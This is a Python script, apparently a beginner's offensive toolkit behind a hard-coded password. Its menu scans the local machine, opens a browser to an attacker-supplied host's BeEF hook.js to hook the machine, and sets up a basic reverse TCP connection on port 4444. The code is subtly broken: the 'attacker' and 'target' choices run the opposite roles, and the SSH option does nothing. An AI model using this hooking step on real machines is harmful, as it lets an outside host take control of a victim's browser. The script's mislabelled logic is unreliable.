import os
def cls():
    os.system("cls")

from colorama import init, Fore, Back, Style
init(autoreset=True)

import getpass
import webbrowser
import re
import socket
import sys
from time import sleep
import platform

#action 3 = listener for reverse TCP/IP
def listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 4444))  # Listen on all interfaces
    s.listen(1)
    print("Listener started on port 4444...")
    conn, addr = s.accept()
    print(f"Connection from {addr}")
    data = conn.recv(1024)
    print("Received:", data.decode())
    conn.sendall(b"ACK: " + data)
    conn.close()
    s.close()



#scanverify = if you dont understand go to action 0, it verifies if the scan was initiated first
scanverify = "no"
#ask for password to start the program else exit

while True:
    askforpassword = getpass.getpass(prompt = "Enter password for the program to start: ")
    sleep(0.1)
    if askforpassword != "krtek":
        print(Fore.RED + "Incorrect password, exiting...")
        sleep(0.5)
    else:
        print(Fore.GREEN + "Password correct, starting program...")
        sleep(0.5)
        break


#ask to scan the machine whilst if "y" then gather system information else if "n" ask to continue else exit
print("Welcome, ")
while True:
    cls()
    print("Choose your action: ")
    print("0) Print current machine scan outcome (only usable after action 1)") 
    sleep(0.1)
    print("")
    sleep(0.1)
    print("1) Scan this machine")
    sleep(0.1)
    print("2) Attempt to hook this machine via BeEF")
    sleep(0.1)
    print("3) Attempt a local reverse TCP/IP connection")
    sleep(0.1)
    print("4) Attempt a local SSH connection")
    sleep(0.1)
    print("")
    sleep(0.1)
    print("99) To exit the program")
    sleep(0.1)
    action = input("Your action: ")
    cls()
    if action == "1":
        scanverify = "yes"
        cls()
        print("Gathering system information...")
        sleep(1)
        #gather system information using platform module
        print("System Information:")
        sleep(0.1)
        system=platform.system()
        print(Fore.RED + platform.system())
        sleep(0.1)
        node=platform.node()
        print(platform.node())
        sleep(0.1)
        machine=platform.machine()
        print(platform.machine())
        sleep(0.1)
        platform_info=platform.platform()
        print(Fore.RED + platform.platform())
        sleep(0.1)
        ip=socket.gethostbyname(socket.gethostname())
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(Fore.RED + s.getsockname()[0])
        s.close()
        print("System information gathered.")
        sleep(1)
        input("Press Enter to continue...")
    
        info=system + "\n" + node + "\n" + machine + "\n" + platform_info + "\n" + ip

    else:
        print("")
    cls()

#Action 2 = beef hook
    if action == "2":
        pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$"
        sleep(0.1)
        while True:
            beefip=input("IP that beef is running on (pure IP number with port-native port 3000): ")
            if re.match (pattern, beefip):
                cls()
                print("Valid IP, trying hook...")
                sleep(0.1)
                webbrowser.open("http://" + beefip + "/hook.js")
                print("The hook has started...")
                sleep(1)
                break

            else:
                print("Invalid IP input")
                sleep(0.1)

    else:
        print("")

#Action 0 = Printing the outcome of the scan
    if action == "0":
        if scanverify == "yes":
            print(Fore.RED + info)
        else:
            cls()
            print("Scan was not initiated (action 1), run scan first")
            sleep(4)
    else:
        print("")

#Action 99 = exiting the program
    if action == "99":
        print("Exiting the program...")
        sleep(3)
        exit()

#Action 3 = reverse TCP/IP
    if action == "3":
        print(Fore.RED + "!!!WARNING!!!")
        sleep(1)
        print("This action requires the attacker to run a .py script")
        sleep(2)
        cls()

        print("Which .py script to run: ")
        sleep(0.1)
        print("")
        sleep(0.1)
        print("1) Attacker machine (.py reverse TCP/IP listener starter) ")                                              
        sleep(0.1)                                                                                                       
        print("2) Target machine (.py reverse TCP/IP starter) ")                                                         

        while True:                                                    
            #listener / target machine
            tcpaction = input("Your action: ")
            if tcpaction == "1":
                def connector(server_ip = input("Input attacker IP (without port): ")):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((server_ip, 4444))
                    s.sendall(b"Hello from client")
                    resp = s.recv(1024)
                    print("Server replied:", resp.decode())
                    s.close()

                connector()
            elif tcpaction == "2":
                listener()
            else:
                print("")